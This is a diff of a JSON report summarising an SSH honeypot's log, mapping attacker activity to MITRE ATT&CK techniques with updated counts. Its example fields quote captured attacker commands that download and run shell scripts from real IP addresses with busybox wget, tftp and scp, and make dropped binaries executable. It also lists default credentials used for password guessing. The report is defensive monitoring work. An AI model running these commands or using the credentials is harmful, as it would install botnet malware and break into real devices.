@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-27 05:00:27",
+  "generated": "2026-08-27 06:02:06",
   "totals": {
-    "commands": 195,
-    "login_failed": 200,
-    "login_success": 31,
-    "sessions": 256
+    "commands": 203,
+    "login_failed": 264,
+    "login_success": 36,
+    "sessions": 331
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 200,
+      "count": 264,
       "examples": [
         "root / zlxx.",
         "root / root",
@@ -21,30 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-08-27T00:04:34.466347Z",
-      "last": "2026-08-27T04:50:26.727889Z",
-      "unique_ips": 61
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 35,
-      "examples": [
-        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
-        "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
-        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-        ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
-      ],
-      "first": "2026-08-27T00:20:02.855145Z",
-      "last": "2026-08-27T04:04:26.064672Z",
-      "unique_ips": 6
+      "last": "2026-08-27T05:52:30.488954Z",
+      "unique_ips": 72
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 31,
+      "count": 36,
       "examples": [
         "admin / 12345",
         "default / techsupport",
@@ -53,14 +37,30 @@
         "root / taZz@01"
       ],
       "first": "2026-08-27T00:03:05.692337Z",
-      "last": "2026-08-27T04:45:50.062444Z",
-      "unique_ips": 30
+      "last": "2026-08-27T05:52:34.905128Z",
+      "unique_ips": 35
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 36,
+      "examples": [
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+        "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
+      ],
+      "first": "2026-08-27T00:20:02.855145Z",
+      "last": "2026-08-27T05:28:03.584518Z",
+      "unique_ips": 7
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 23,
+      "count": 25,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -69,8 +69,8 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-27T00:20:02.855145Z",
-      "last": "2026-08-27T04:04:26.064672Z",
-      "unique_ips": 6
+      "last": "2026-08-27T05:28:04.557076Z",
+      "unique_ips": 7
     },
     {
       "id": "T1033",
@@ -113,10 +113,14 @@
   "unmapped": [
     [
       "shell",
-      12
+      13
     ],
     [
       "sh",
+      13
+    ],
+    [
+      "system",
       12
     ],
     [
@@ -124,12 +128,8 @@
       12
     ],
     [
-      "system",
-      11
-    ],
-    [
       "enable",
-      10
+      11
     ],
     [
       "/bin/busybox",
@@ -188,7 +188,7 @@
       2
     ],
     [
-      ">/tmp/.codi && cd /tmp/",
+      "ping; sh",
       2
     ]
   ]
